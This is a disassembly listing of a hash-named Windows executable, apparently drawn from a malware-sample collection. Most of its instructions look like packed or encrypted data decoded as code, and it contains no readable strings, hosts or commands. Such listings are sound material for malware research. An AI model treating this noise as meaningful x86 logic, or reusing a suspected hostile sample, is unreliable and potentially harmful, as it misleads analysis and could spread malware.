
84ec0ee849ee604aabdd27b0d880e83f22face0f0ca74e83244434bf05b66cda.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [ebp+0x1],dl
  401003:	add    dl,bh
  401005:	push   ebx
  401006:	inc    ecx
  401007:	add    BYTE PTR [ebp+0x68507461],dh
  40100d:	push   0x63
  40100f:	inc    ecx
  401010:	push   esi
  401011:	popa   
  401012:	jb     0x401079
  401014:	imul   esi,DWORD PTR [esi+0x0],0x616a2e00
  40101b:	fs inc esi
  40101d:	ins    BYTE PTR es:[edi],dx
  40101e:	bound  esi,QWORD PTR [edx+0x5b]
  401021:	ja     0x40109c
  401023:	inc    ebp
  401024:	inc    edx
  401025:	inc    esp
  401026:	add    BYTE PTR [eax],al
  401028:	cs push 0x61
  40102b:	fs inc esi
  40102d:	ins    BYTE PTR es:[edi],dx
  40102e:	bound  esi,QWORD PTR [edx+0x1b]
  401031:	ja     0x4010ac
  401033:	inc    ebp
  401034:	and    dl,BYTE PTR [edx+0x0]
  401037:	add    BYTE PTR ds:0x254d7460,dh
  40103d:	popa   
  40103e:	jne    0x4010ac
  401040:	pop    ss
  401041:	dec    ebp
  401042:	popa   
  401043:	outs   dx,BYTE PTR ds:[esi]
  401044:	push   ds
  401045:	imul   esp,DWORD PTR [ebp+0x41],0x4fa
  40104c:	mov    ecx,0xe6616576
  401051:	pop    edi
  401052:	inc    esi
  401053:	imul   edx,esi,0xce00415f
  401059:	jne    0x4010cf
  40105b:	jb     0x401036
  40105d:	arpl   WORD PTR [ecx+eax*2-0x6],si
  401061:	add    al,0x0
  401063:	add    BYTE PTR [ebp+0x57745f],bh
	...
  401079:	add    bl,dl
  40107b:	push   0x64
  40107d:	outs   dx,DWORD PTR ds:[esi]
  40107e:	lods   eax,DWORD PTR ds:[esi]
  40107f:	jne    0x4010c5
  401081:	imul   ebp,DWORD PTR [eax-0x6a8b9ca1],0xfa417976
  40108b:	add    al,0x0
  40108d:	add    BYTE PTR [ebp-0x62b28ba1],bh
  401093:	pusha  
  401094:	jne    0x401102
  401096:	lahf   
  401097:	dec    esp
  401098:	popa   
  401099:	outs   dx,BYTE PTR ds:[esi]
  40109a:	xchg   esi,eax
  40109b:	push   0x4fa5765
  4010a0:	add    BYTE PTR [eax],al
  4010a2:	test   BYTE PTR [esi],0x40
  4010a5:	add    BYTE PTR [esi],cl
  4010a7:	pop    es
  4010a8:	inc    eax
  4010a9:	add    BYTE PTR [esi],dl
  4010ab:	pop    es
  4010ac:	inc    eax
  4010ad:	add    BYTE PTR [esi],cl
  4010af:	pop    es
  4010b0:	inc    eax
  4010b1:	add    BYTE PTR [edx+0x7],al
  4010b4:	inc    eax
  4010b5:	add    BYTE PTR [esi],ch
  4010b7:	pop    es
  4010b8:	inc    eax
  4010b9:	add    BYTE PTR [edx+0x7],bl
  4010bc:	inc    eax
  4010bd:	add    BYTE PTR [edx],dh
  4010bf:	pop    es
  4010c0:	inc    eax
  4010c1:	add    BYTE PTR ds:0x28507460,dh
  4010c7:	push   0x63
  4010c9:	inc    ecx
  4010ca:	push   ss
  4010cb:	popa   
  4010cc:	jb     0x401133
  4010ce:	or     DWORD PTR [esi+0x0],esi
  4010d1:	add    BYTE PTR [esi],bh
  4010d3:	push   0x61
  4010d5:	fs ss ins BYTE PTR es:[edi],dx
  4010d8:	bound  esi,QWORD PTR [edx+0x1b]
  4010db:	ja     0x401156
  4010dd:	inc    ebp
	...
  4010ee:	add    BYTE PTR [eax],al
  4010f0:	repnz inc ebx
  4010f2:	add    BYTE PTR [eax],al
  4010f4:	loope  0x401155
  4010f6:	jb     0x401166
  4010f8:	fild   QWORD PTR [eax+0x33]
  4010fb:	xor    cl,BYTE PTR [ecx+eiz*2]
  4010fe:	ins    BYTE PTR es:[edi],dx
  4010ff:	ins    BYTE PTR es:[edi],dx
  401100:	cli    
  401101:	add    al,0x0
  401103:	add    bh,bl
  401105:	jne    0x40117d
  401107:	arpl   ax,cx
  401109:	jo     0x401139
  40110b:	fs into 
  40110d:	push   0x5fa70000
  401112:	ins    DWORD PTR es:[edi],dx
  401113:	jae    0x4010ac
  401115:	jo     0x401117
  401117:	add    BYTE PTR [edi-0x579c898b],dl
  40111d:	jo     0x40114d
  40111f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  401121:	push   0x5f9f0000
  401126:	ins    DWORD PTR es:[edi],dx
  401127:	arpl   WORD PTR [edx-0x5bffff85],cx
  40112d:	imul   esi,DWORD PTR [edx+0x74],0x6f
  401131:	data16 ins BYTE PTR es:[edi],dx
  401133:	inc    ecx
  401134:	pop    esi
  401135:	imul   ebp,DWORD PTR [edi+0x63],0x4fa
  40113c:	inc    esp
  40113d:	outs   dx,BYTE PTR ds:[esi]
  40113e:	jb     0x4011b4
  401140:	dec    edi
  401141:	data16 ins BYTE PTR es:[edi],dx
  401143:	inc    ecx
  401144:	pop    esi
  401145:	imul   ebp,DWORD PTR [edi+0x63],0x4fa
  40114c:	daa    
  40114d:	ins    DWORD PTR es:[di],dx
  40114f:	popa   
  401150:	sub    cl,BYTE PTR [edi+0x69]
  401153:	add    BYTE PTR gs:[eax],al
	...
  401166:	and    eax,0x13466648
  40116b:	imul   esp,DWORD PTR [ebp+0x0],0x74726e44
  401172:	pcmpgtd mm5,QWORD PTR [eax+edx*2+0x8]
  401177:	push   0x71196574
  40117c:	add    BYTE PTR [eax],al
  40117e:	xor    ah,BYTE PTR [edx+0x61]
  401181:	jo     0x40113e
  401183:	push   0x4d96f6c
  401188:	add    BYTE PTR [eax],al
  40118a:	shl    DWORD PTR [ecx+0x72],1
  40118d:	outs   dx,BYTE PTR ds:[esi]
  40118e:	xlat   BYTE PTR ds:[ebx]
  40118f:	push   0x61243233
  401194:	ins    BYTE PTR es:[edi],dx
  401195:	ins    BYTE PTR es:[edi],dx
  401196:	cli    
  401197:	add    al,0x0
  401199:	add    BYTE PTR [ebp-0x37af8b9f],bh
  40119f:	arpl   WORD PTR [di-0x57],sp
  4011a3:	jae    0x4011ed
  4011a5:	gs fwait
  4011a7:	je     0x4011a9
  4011a9:	add    dl,bh
  4011ab:	add    al,0x44
  4011ad:	add    edx,edi
  4011af:	mov    al,ds:0xeafa9059
  4011b4:	add    eax,DWORD PTR [eax]
  4011b6:	cli    
  4011b7:	jmp    0xf73a11bf
  4011bc:	sti    
  4011bd:	add    dl,bh
  4011bf:	xor    eax,0xedfa0003
  4011c4:	add    eax,DWORD PTR [eax]
  4011c6:	cli    
  4011c7:	sub    eax,0x4
	...
  4011dc:	cli    
  4011dd:	in     eax,dx
  4011de:	add    eax,DWORD PTR [eax]
  4011e0:	cli    
  4011e1:	in     eax,dx
  4011e2:	add    eax,DWORD PTR [eax]
  4011e4:	cli    
  4011e5:	in     eax,dx
  4011e6:	add    eax,DWORD PTR [eax]
  4011e8:	cli    
  4011e9:	in     eax,dx
  4011ea:	add    eax,DWORD PTR [eax]
  4011ec:	cli    
  4011ed:	in     eax,dx
  4011ee:	add    eax,DWORD PTR [eax]
  4011f0:	cli    
  4011f1:	in     eax,dx
  4011f2:	add    eax,DWORD PTR [eax]
  4011f4:	cli    
  4011f5:	in     eax,dx
  4011f6:	add    eax,DWORD PTR [eax]
  4011f8:	cli    
  4011f9:	in     eax,dx
  4011fa:	add    eax,DWORD PTR [eax]
  4011fc:	cli    
  4011fd:	ins    DWORD PTR es:[edi],dx
  4011fe:	add    al,0x0
  401200:	cli    
  401201:	fistp  WORD PTR [edx]
  401203:	mov    edx,0x9afee04
  401208:	mov    edi,0x3601bbcc
  40120d:	test   eax,0x5125425
  401212:	ja     0x401234
  401214:	jmp    0x68cc:0xe8676afb
  40121b:	and    cl,bl
  40121d:	int3   
  40121e:	imul   ebp,DWORD PTR [esi-0x33],0xdf6223d9
  401225:	or     eax,0xddc7576
  40122a:	ins    DWORD PTR es:[edi],dx
  40122b:	outs   dx,BYTE PTR ds:[esi]
  40122c:	sbb    ah,BYTE PTR [edx-0x3ee5acb6]
  401232:	push   0x64
  401234:	lahf   
  401235:	test   DWORD PTR [eax],0xcd05000d
  40123b:	add    edi,edx
  40123d:	add    al,0xe9
  40123f:	add    eax,DWORD PTR [eax]
	...
  401251:	add    dl,bh
  401253:	add    al,0xb9
  401255:	inc    eax
  401256:	cli    
  401257:	add    al,0x9d
  401259:	add    al,0xf9
  40125b:	add    al,0xf7
  40125d:	jbe    0x4012d1
  40125f:	inc    edi
  401260:	jmp    0xe9450c68
  401265:	add    edi,edx
  401267:	add    al,0x9
  401269:	add    al,0xfd
  40126b:	add    esi,edx
  40126d:	add    al,0xf8
  40126f:	xor    ch,cl
  401271:	stc    
  401272:	cli    
  401273:	add    al,0xe9
  401275:	dec    ebp
  401276:	cli    
  401277:	add    al,0xe9
  401279:	add    edi,edx
  40127b:	add    al,0x55
  40127d:	in     eax,dx
  40127e:	cli    
  40127f:	add    al,0xe9
  401281:	adc    edi,edx
  401283:	add    al,0xe9
  401285:	adc    edi,ebx
  401287:	add    al,0xe9
  401289:	add    edi,DWORD PTR [edx]
  40128b:	add    eax,0x4fa13e9
  401290:	jmp    0xed450c9a
  401295:	add    edi,edx
  401297:	add    al,0xe9
  401299:	add    edi,edx
  40129b:	add    al,0xed
  40129d:	add    edi,edx
  40129f:	add    al,0xe9
  4012a1:	add    edi,edx
  4012a3:	add    al,0xe9
  4012a5:	jae    0x4012a2
  4012a7:	add    al,0xe9
  4012a9:	add    eax,0xf34504fa
  4012ae:	sti    
  4012af:	add    al,0xeb
  4012b1:	add    edi,edx
  4012b3:	add    al,0xe9
  4012b5:	add    eax,DWORD PTR [eax]
	...
  4012c7:	add    dl,ch
  4012c9:	add    al,0xe9
  4012cb:	adc    edi,edx
  4012cd:	add    al,0xe9
  4012cf:	add    ebp,edx
  4012d1:	add    al,0xe9
  4012d3:	adc    edi,edx
  4012d5:	add    al,0x0
  4012d7:	jmp    0xd94017d5
  4012dc:	stc    
  4012dd:	add    al,0x0
  4012df:	jmp    0xe94017dd
  4012e4:	stc    
  4012e5:	add    al,0x0
  4012e7:	in     eax,0xa8
  4012e9:	add    eax,DWORD PTR [eax]
  4012eb:	and    ecx,edi
  4012ed:	add    al,0x0
  4012ef:	jmp    0xe94017ed
  4012f4:	stc    
  4012f5:	add    al,0x0
  4012f7:	jmp    0xe94017f5
  4012fc:	stc    
  4012fd:	add    al,0x0
  4012ff:	jmp    0xe94017fd
  401304:	stc    
  401305:	add    al,0x0
  401307:	jmp    0xe9401805
  40130c:	stc    
  40130d:	add    al,0x0
  40130f:	jmp    0xe940180d
  401314:	stc    
  401315:	add    al,0x0
  401317:	jmp    0xe9401815
  40131c:	stc    
  40131d:	add    al,0x0
  40131f:	jmp    0xe940181d
  401324:	stc    
  401325:	add    al,0x0
  401327:	jmp    0xe9401825
	...
  40133c:	add    BYTE PTR [eax],al
  40133e:	stc    
  40133f:	add    al,0x0
  401341:	jmp    0xe940183f
  401346:	stc    
  401347:	add    al,0x0
  401349:	jmp    0xe9401847
  40134e:	stc    
  40134f:	add    al,0x0
  401351:	leave  
  401352:	rol    BYTE PTR [ebx],0x0
  401355:	ins    DWORD PTR es:[edi],dx
  401356:	stc    
  401357:	add    al,0x0
  401359:	jmp    0xe9401857
  40135e:	stc    
  40135f:	add    al,0x0
  401361:	add    BYTE PTR [ebx+0x1],dl
  401364:	add    BYTE PTR [eax],al
  401366:	push   ebx
  401367:	add    DWORD PTR [eax],eax
  401369:	add    BYTE PTR [ebx],ah
  40136b:	add    DWORD PTR [eax],eax
  40136d:	add    BYTE PTR [ebx],ah
  40136f:	add    DWORD PTR [eax],eax
  401371:	add    BYTE PTR [ebp+0x65],cl
  401374:	gs js  0x4012fe
  401377:	add    DWORD PTR [eax],eax
  401379:	add    BYTE PTR [eax+0x230000ed],bl
  40137f:	adc    DWORD PTR [eax],eax
  401381:	add    BYTE PTR [ebx],dl
  401383:	sti    
  401384:	add    BYTE PTR [eax],al
  401386:	adc    edi,edi
  401388:	(bad)  
  401389:	jmp    ebx
  40138b:	or     BYTE PTR [eax],al
  40138d:	add    bl,ah
  40138f:	or     BYTE PTR [eax],al
  401391:	add    bl,dl
  401393:	or     BYTE PTR [eax],al
  401395:	add    bl,dh
  401397:	or     BYTE PTR [eax],al
  401399:	pusha  
  40139a:	std    
  40139b:	jp     0x401401
  40139d:	popa   
  40139e:	daa    
  40139f:	push   0x0
	...
  4013b4:	rol    DWORD PTR [edi],cl
  4013b6:	add    BYTE PTR [eax],al
  4013b8:	rcr    DWORD PTR [eax],cl
  4013ba:	add    DWORD PTR [eax],eax
  4013bc:	mov    ds:0xa300000a,eax
  4013c1:	or     BYTE PTR [ecx],al
  4013c3:	add    BYTE PTR [ebx-0x6cfffff8],dl
  4013c9:	or     BYTE PTR [eax],al
  4013cb:	add    BYTE PTR [ebx-0x1cfffff8],ah
  4013d1:	or     BYTE PTR [eax],al
  4013d3:	inc    eax
  4013d4:	lods   eax,DWORD PTR ds:[esi]
  4013d5:	push   esp
  4013d6:	popa   
  4013d7:	je     0x4013cb
  4013d9:	or     BYTE PTR [eax],al
  4013db:	add    BYTE PTR [ebx+0x63000045],bh
  4013e1:	sub    BYTE PTR [ecx],al
  4013e3:	add    BYTE PTR [ebx+0x4a],dl
  4013e6:	add    BYTE PTR [eax],al
  4013e8:	push   ebx
  4013e9:	or     al,BYTE PTR [ecx]
  4013eb:	add    dl,bh
  4013ed:	fld    QWORD PTR [ebx]
  4013ef:	add    dl,bh
  4013f1:	fld    QWORD PTR [ebx]
  4013f3:	add    dl,bh
  4013f5:	fld    QWORD PTR [ebx]
  4013f7:	add    dl,bh
  4013f9:	popf   
  4013fa:	add    eax,DWORD PTR [eax]
  4013fc:	cmp    bl,dh
  4013fe:	add    eax,DWORD PTR [eax]
  401400:	cli    
  401401:	fld    QWORD PTR [ebx]
  401403:	add    dl,bh
  401405:	fld    QWORD PTR [ebx]
  401407:	add    dl,bh
  401409:	fld    QWORD PTR [ebx]
  40140b:	add    dl,bh
  40140d:	mov    al,0x8c
  40140f:	in     al,dx
  401410:	mov    ds:0xfa4013d0,al
  401415:	add    eax,0x175
	...
  40142a:	cmp    ebx,esi
  40142c:	div    DWORD PTR [ebp+0x2]
  40142f:	mov    BYTE PTR [edx],al
  401431:	push   0xfffffffa
  401433:	add    eax,0xddfadabc
  401438:	int3   
  401439:	ret    0xddf6
  40143c:	push   eax
  40143d:	mov    esp,esi
  40143f:	inc    ebp
  401440:	sub    dl,BYTE PTR [eax]
  401442:	cmp    bl,dh
  401444:	sti    
  401445:	jb     0x401442
  401447:	sahf   
  401448:	test   DWORD PTR [ebx+0x7403f63f],0x8516701
  401452:	or     edi,0xaaf275f6
  401458:	push   edx
  401459:	or     BYTE PTR [ebx+0x2f00009f],dh
  40145f:	addr16 call 0x6cd5cae8
  401465:	dec    edi
  401466:	jmp    0xc2dd:0x8f8041d
  40146d:	push   DWORD PTR [ebp-0x10]
  401470:	pop    es
  401471:	(bad)  
  401472:	mov    bh,0x75
  401474:	mov    edi,0xe9046645
  401479:	add    edi,edx
  40147b:	add    al,0x72
  40147d:	push   ecx
  40147e:	add    al,BYTE PTR [eax-0xc059605]
  401484:	aam    0x13
  401486:	inc    ebp
  401487:	jns    0x4014ce
  401489:	test   edi,0x713eec
	...
  40149f:	add    BYTE PTR [edx],al
  4014a1:	hlt    
  4014a2:	fwait
  4014a3:	cmovae eax,esi
  4014a6:	fld    QWORD PTR [ebx]
  4014a8:	iret   
  4014a9:	jg     0x4014c0
  4014ab:	xor    DWORD PTR [esi],0xffffffec
  4014ae:	xchg   ecx,eax
  4014af:	jge    0x40149b
  4014b1:	inc    esp
  4014b2:	jmp    0x2a459db2
  4014b7:	idiv   DWORD PTR ds:0xfa040149
  4014bd:	add    al,0xe9
  4014bf:	mov    esi,0x3e9f13f
  4014c4:	cli    
  4014c5:	add    al,0x62
  4014c7:	push   ecx
  4014c8:	bnd jge 0x4014c6
  4014cb:	mov    BYTE PTR [edi],dh
  4014cd:	in     eax,dx
  4014ce:	cmp    DWORD PTR [edx-0x8],ebp
  4014d1:	icebp  
  4014d2:	pop    esp
  4014d3:	clc    
  4014d4:	int    0x78
  4014d6:	shl    esi,1
  4014d8:	dec    edi
  4014d9:	std    
  4014da:	lds    edx,FWORD PTR [ecx-0x1a]
  4014dd:	jge    0x401503
  4014df:	cld    
  4014e0:	ret    
  4014e1:	(bad)  
  4014e2:	in     eax,dx
  4014e3:	add    eax,DWORD PTR [edi+0x7e]
  4014e6:	mov    ebp,0x11edbe82
  4014eb:	ret    0x450a
  4014ee:	jmp    0xaa441dee
  4014f3:	div    BYTE PTR [ebp-0x5fc6eb8]
  4014f9:	add    al,0xe9
  4014fb:	mov    esi,0x3e9f137
  401500:	cli    
  401501:	add    al,0x0
  401503:	bound  eax,QWORD PTR [eax]
	...
  401515:	add    dl,cl
  401517:	cld    
  401518:	mov    bl,bl
  40151a:	jb     0x401564
  40151c:	clc    
  40151d:	mov    ecx,0xd4ff03d3
  401522:	dec    ebp
  401523:	bnd jne 0x401577
  401526:	inc    esp
  401527:	js     0x401531
  401529:	dec    esi
  40152a:	stos   DWORD PTR es:[edi],eax
  40152b:	sbb    bh,bh
  40152d:	mov    esp,0x3e87dcf1
  401532:	sub    al,0xf2
  401534:	push   eax
  401535:	(bad)  
  401536:	retf   0x8afc
  401539:	fist   DWORD PTR [ebx+0x24e96a04]
  40153f:	js     0x40153d
  401541:	push   ds
  401542:	mov    ch,ah
  401544:	call   FWORD PTR [ecx+eax*1-0x5e0aad0e]
  40154b:	jge    0x4015a2
  40154d:	add    eax,edi
  40154f:	push   edi
  401550:	or     al,0xc2
  401552:	leave  
  401553:	jp     0x40155b
  401555:	ret    0xbbb9
  401558:	ret    0xf9e1
  40155b:	lods   al,BYTE PTR ds:[esi]
  40155c:	add    ecx,ebp
  40155e:	stc    
  40155f:	add    al,0xc9
  401561:	stos   DWORD PTR es:[edi],eax
  401562:	push   es
  401563:	add    eax,0x85e26255
  401568:	(bad)  
  401569:	int    0x56
  40156b:	and    dl,BYTE PTR [ecx]
  40156d:	sub    esi,esi
  40156f:	in     al,dx
  401570:	jb     0x40155a
  401572:	mov    edx,0x63cfff1
  401577:	bnd jne 0x40155b
	...
  40158a:	add    BYTE PTR [eax],al
  40158c:	xchg   ecx,eax
  40158d:	ins    BYTE PTR es:[edi],dx
  40158e:	jmp    DWORD PTR [esi+0x14bffda7]
  401594:	cli    
  401595:	mov    ebx,0x7df9e5c2
  40159a:	push   ebp
  40159b:	loope  0x40160f
  40159d:	push   ss
  40159e:	lea    eax,[eax]
  4015a0:	into   
  4015a1:	in     al,dx
  4015a2:	push   eax
  4015a3:	jmp    FWORD PTR [esi+0x15]
  4015a6:	push   DWORD PTR [ebp+0x57]
  4015a9:	clc    
  4015aa:	jne    0x4015b4
  4015ac:	aam    0x56
  4015ae:	or     al,0x85
  4015b0:	adc    esi,DWORD PTR [ecx+0x13]
  4015b3:	mov    ebx,DWORD PTR [esi+0x53453bf9]
  4015b9:	bound  eax,QWORD PTR [edi]
  4015bb:	mov    eax,0x552
  4015c0:	test   al,0xf2
  4015c2:	sub    al,al
  4015c4:	enter  0x2b06,0xc0
  4015c8:	fcmovb st,st(6)
  4015ca:	or     al,0x0
  4015cc:	mov    ?,WORD PTR [esp+ebp*8-0x7d]
  4015d0:	iret   
  4015d1:	in     al,dx
  4015d2:	push   esi
  4015d3:	push   0x40159e
  4015d8:	jmp    0x401650
  4015da:	add    ebx,eax
  4015dc:	hlt    
  4015dd:	cmp    DWORD PTR [ebp+0xc],0x13
  4015e1:	popa   
  4015e2:	push   es
  4015e3:	xor    DWORD PTR [esi-0x4],0xffffffff
  4015e7:	je     0x4015c5
  4015e9:	sbb    eax,0xc31a5ec0
  4015ee:	or     al,0x0
	...
  401600:	add    BYTE PTR [eax],al
  401602:	push   eax
  401603:	ja     0x401615
  401605:	add    BYTE PTR [esi],ch
  401607:	sti    
  401608:	mov    bh,0x1
  40160a:	jecxz  0x401610
  40160c:	add    BYTE PTR [esi-0x66],bl
  40160f:	(bad)  
  401610:	or     al,0x0
  401612:	dec    eax
  401613:	pop    edi
  401614:	or     al,0xc7
  401616:	fsubp  st(4),st
  401618:	add    BYTE PTR [eax],al
  40161a:	mov    ds:0x9b558b04,eax
  40161f:	jge    0x401633
  401621:	(bad)  
  401622:	into   
  401623:	in     al,dx
  401624:	push   eax
  401625:	(bad)  
  401626:	out    dx,al
  401627:	sbb    BYTE PTR [esi-0x1],dl
  40162a:	cli    
  40162b:	adc    BYTE PTR [edi+edi*8],cl
  40162e:	sub    dh,ch
  401630:	jle    0x4015f2
  401632:	add    ebx,edi
  401634:	sub    al,al
  401636:	aam    0xb4
  401638:	ror    DWORD PTR [edx+edi*8],0x5a
  40163c:	jbe    0x40163a
  40163e:	cli    
  40163f:	clc    
  401640:	cld    
  401641:	sub    bh,BYTE PTR [edx]
  401643:	enter  0xc2ca,0x6
  401647:	fimul  WORD PTR [eax-0xc24b1bb]
  40164d:	sub    DWORD PTR [edi-0x7d3b9113],edi
  401653:	fld    QWORD PTR [ebx]
  401655:	add    dl,bh
  401657:	(bad)
  40165b:	fisttp QWORD PTR [esi-0x75]
  40165e:	push   ss
  40165f:	pop    ebp
  401660:	mov    edi,0xf4270df8
  401665:	push   0x0
	...
  401676:	add    BYTE PTR [eax],al
  401678:	(bad)  
  401679:	jmp    0x4016be
  40167b:	add    BYTE PTR [edx],dl
  40167d:	mov    WORD PTR [edx],es
  40167f:	ret    
  401680:	add    eax,0xfa6a0384
  401685:	xchg   ebx,eax
  401686:	add    BYTE PTR [edx-0x6],ch
  401689:	xchg   ebx,eax
  40168a:	add    BYTE PTR [eax-0x6],ch
  40168d:	fld    QWORD PTR [ebx]
  40168f:	and    ch,0x78
  401692:	or     ebp,eax
  401694:	jnp    0x401644
  401696:	add    al,0x0
  401698:	sub    DWORD PTR [eax],0xfffffff0
  40169b:	inc    eax
  40169c:	inc    edi
  40169d:	loop   0x40165b
  40169f:	ret    0xddf2
  4016a2:	pop    ebp
  4016a3:	add    BYTE PTR [edi+0x20],ch
  4016a6:	in     al,dx
  4016a7:	push   eax
  4016a8:	and    bl,dh
  4016aa:	adc    eax,DWORD PTR [eax]
  4016ac:	cli    
  4016ad:	push   0x9e95f889
  4016b2:	repz push eax
  4016b4:	popf   
  4016b5:	add    al,0x1c
  4016b7:	lock mov ds:0xfa04b663,al
  4016bd:	sti    
  4016be:	test   al,0x79
  4016c0:	hlt    
  4016c1:	out    dx,eax
  4016c2:	adc    al,0xf0
  4016c4:	xchg   edx,eax
  4016c5:	push   ecx
  4016c6:	sahf   
  4016c7:	add    al,0xfa
  4016c9:	sbb    ebp,DWORD PTR [ecx-0x1703c743]
  4016cf:	repnz out dx,eax
  4016d1:	in     al,dx
  4016d2:	pop    esp
  4016d3:	mov    DWORD PTR [edx-0x21],esp
  4016d6:	data16 rep stos BYTE PTR es:[edi],al
  4016d9:	out    dx,eax
  4016da:	aam    0xff
	...
  4016ec:	add    BYTE PTR [eax],al
  4016ee:	push   ebp
  4016ef:	adc    eax,0x8345f356
  4016f4:	int3   
  4016f5:	jmp    0x4016f1
  4016f7:	jns    0x40167e
  4016f9:	repz scas eax,DWORD PTR es:[edi]
  4016fb:	lock push ecx
  4016fd:	cmp    eax,DWORD PTR [ebp+0x4]
  401700:	jmp    0xe94512b0
  401705:	add    esi,DWORD PTR [ebx]
  401707:	ret    0x3f1
  40170a:	scas   eax,DWORD PTR es:[edi]
  40170b:	jnp    0x40171a
  40170d:	pop    esp
  40170e:	jne    0x401722
  401710:	test   eax,0xe8720203
  401715:	(bad)  
  401716:	std    
  401717:	pop    ecx
  401718:	jmp    0x401777
  40171a:	cli    
  40171b:	in     eax,dx
  40171c:	je     0x401719
  40171e:	aad    0xa1
  401720:	hlt    
  401721:	repnz in eax,0xbc
  401724:	sub    ecx,DWORD PTR [eax]
  401726:	cli    
  401727:	push   edi
  401728:	jb     0x401709
  40172a:	bound  ebp,QWORD PTR [ecx-0x1305bc05]
  401730:	pop    ebx
  401731:	add    eax,0x443eeb9
  401736:	push   eax
  401737:	add    eax,0xdd0278c6
  40173c:	outs   dx,BYTE PTR ds:[esi]
  40173d:	lock lods eax,DWORD PTR ds:[esi]
  40173f:	out    dx,al
  401740:	add    BYTE PTR [eax+0x140009bf],ah
  401746:	sbb    eax,0xa1ad83e1
  40174b:	pop    ebp
  40174c:	(bad)  
  40174d:	sti    
  40174e:	cmp    DWORD PTR ds:0x1bf8,eax
	...
  401764:	inc    ecx
  401766:	dec    DWORD PTR [esi+0x2c8f0102]
  40176c:	data16 mov BYTE PTR [ebp+0x7d],0xf9
  401771:	add    al,0x0
  401773:	jmp    0xf53f1c3f
  401778:	pop    ebp
  401779:	out    dx,eax
  40177a:	jne    0x40176d
  40177c:	xor    DWORD PTR [ebp+edi*8+0x5e],esp
  401780:	dec    eax
  401781:	jp     0x4017d8
  401783:	loope  0x401749
  401785:	adc    bh,bh
  401787:	aam    0x4d
  401789:	out    dx,al
  40178a:	jne    0x4017cd
  40178c:	sub    BYTE PTR [eax+0x8],bh
  40178f:	ds (bad) 
  401791:	or     al,0xc9
  401793:	sub    esp,DWORD PTR [ecx]
  401795:	out    dx,al
  401796:	push   esp
  401797:	bound  edi,QWORD PTR ds:0xb9fa005d
  40179d:	add    al,0xf8
  40179f:	fwait
  4017a0:	test   cl,0xff
  4017a3:	cmp    ecx,0xffffffed
  4017a6:	jne    0x401789
  4017a8:	and    DWORD PTR [ebx-0x4417f901],ebx
  4017ae:	ret    0xf9e5
  4017b1:	push   edi
  4017b2:	mov    eax,DWORD PTR ds:0x6a145864
  4017b8:	syscall 
  4017ba:	jne    0x4017a9
  4017bc:	nop
  4017bd:	ret    0xe910
  4017c0:	retf   0x1077
  4017c3:	(bad)  
  4017c4:	dec    ebp
  4017c5:	add    edi,edi
  4017c7:	push   esp
	...
  4017d8:	add    BYTE PTR [eax],al
  4017da:	mov    esi,0xbe00f4e5
  4017df:	repz dec DWORD PTR [ebx+0x2210d06]
  4017e6:	pop    edx
  4017e7:	(bad)  
  4017e8:	adc    BYTE PTR [eax],al
  4017ea:	push   es
  4017eb:	jo     0x4017d9
  4017ed:	and    DWORD PTR [edi-0xc],0xffffffff
  4017f1:	jne    0x401792
  4017f3:	dec    edi
  4017f4:	add    al,0x8d
  4017f6:	(bad)  
  4017f7:	hlt    
  4017f8:	push   eax
  4017f9:	jmp    esi
  4017fb:	lock out 0xc3,eax
  4017fe:	jl     0x4017f3
  401800:	dec    DWORD PTR [ebx+0x38830516]
  401806:	push   ebx
  401807:	jne    0x401810
  401809:	mov    edx,DWORD PTR [esi]
  40180b:	cmc    
  40180c:	bswap  eax
  40180e:	test   al,0x6
  401810:	sub    eax,eax
  401812:	or     al,bh
  401814:	or     BYTE PTR [eax],al
  401816:	xchg   BYTE PTR [eax-0x14],dh
  401819:	adc    DWORD PTR [edi],0xfffffff5
  40181c:	push   DWORD PTR [ebp+0x2f]
  40181f:	dec    edi
  401820:	add    cl,BYTE PTR [ebp-0xaf0caa]
  401826:	jmpw   0xb011
  40182a:	int3   
  40182b:	repz dec DWORD PTR [ebx+0x3882ed66]
  401832:	and    esi,DWORD PTR [ebp+0x8]
  401835:	shld   DWORD PTR [ebp-0x2],eax,0x86
  40183a:	xlat   BYTE PTR ds:[ebx]
  40183b:	iret   
  40183c:	add    ch,BYTE PTR [ebx]
	...
  40184e:	add    BYTE PTR [eax],al
  401850:	and    esi,DWORD PTR [eax+0x53e308c2]
  401856:	mov    ebp,esp
  401858:	push   eax
  401859:	mov    ebp,0xec66fffc
  40185e:	imul   eax,DWORD PTR [ecx],0x50ff434e
  401864:	lods   al,BYTE PTR ds:[esi]
  401865:	jae    0x40186f
  401867:	call   0x316066
  40186c:	mov    ebp,0x790c4667
  401871:	push   es
  401872:	add    al,0x74
  401874:	hlt    
  401875:	fidivr DWORD PTR [ecx+0x5c7a545]
  40187b:	sub    edi,DWORD PTR [edx-0x5f73a5b]
  401881:	sub    BYTE PTR [ebp-0x14],bh
  401884:	xor    DWORD PTR [ecx],0xddc08314
  40188a:	jbe    0x401890
  40188c:	mov    bl,0xa0
  40188e:	(bad)  
  40188f:	push   DWORD PTR [ecx+ebp*8-0x1]
  401893:	(bad)  
  401894:	out    0xf5,eax
  401896:	fneni(8087 only) 
  401898:	data16 jae 0x40188b
  40189b:	or     edi,DWORD PTR [edx]
  40189d:	icebp  
  40189e:	cld    
  40189f:	mov    ch,BYTE PTR [edi-0x5fd3713]
  4018a5:	fld    QWORD PTR [ebx]
  4018a7:	add    BYTE PTR [ecx-0x1f],dl
  4018aa:	pop    ebp
  4018ab:	add    DWORD PTR ds:0xaffeffd1,edi
  4018b1:	cmc    
  4018b2:	fist   DWORD PTR [ecx+0x0]
	...
  4018c5:	add    BYTE PTR [esi],ch
  4018c7:	sub    esi,eax
  4018c9:	leave  
  4018ca:	cmp    dl,ah
  4018cc:	add    edx,DWORD PTR [ebp+0x71]
  4018cf:	sub    al,BYTE PTR [esp+eax*8+0x757cac16]
  4018d6:	(bad)  
  4018d7:	xchg   edi,eax
  4018d8:	add    ecx,DWORD PTR [ebp-0xacee41]
  4018de:	xchg   ebp,ebp
  4018e0:	pop    ecx
  4018e1:	jmp    FWORD PTR [edi-0xa]
  4018e4:	(bad)  [eax+0xb03ddc7]
  4018ea:	mov    edx,0x5f830969
  4018ef:	fiadd  DWORD PTR [edx]
  4018f1:	jne    0x4018f0
  4018f3:	add    al,0x12
  4018f5:	les    ebp,FWORD PTR [esi+edi*4]
  4018f8:	stos   DWORD PTR es:[edi],eax
  4018f9:	add    dl,bh
